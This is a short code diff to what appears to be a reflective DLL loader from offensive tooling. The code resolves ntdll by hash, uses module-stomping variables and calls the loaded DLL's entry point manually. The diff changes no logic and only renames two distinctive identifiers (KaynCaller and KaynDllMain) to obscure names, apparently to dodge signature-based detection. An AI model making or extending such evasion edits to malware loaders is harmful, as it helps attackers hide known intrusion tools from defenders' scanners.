@@ -51,7 +51,7 @@ SEC( text, B ) VOID Entry( VOID )
     PIMAGE_NT_HEADERS       StompNt         = NULL;
 
     // 0. First we need to get our own image base
-    KaynLibraryLdr          = KaynCaller();
+    KaynLibraryLdr          = Kcall();
     Instance.Modules.Ntdll  = LoaderModPebbb( NTDLL_HASH );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
@@ -200,8 +200,8 @@ SEC( text, B ) VOID Entry( VOID )
         // --------------------------------
         // 6. Finally executing our DllMain
         // --------------------------------
-        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
-        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
+        BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
+        LLDKman( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
     }
 }
 
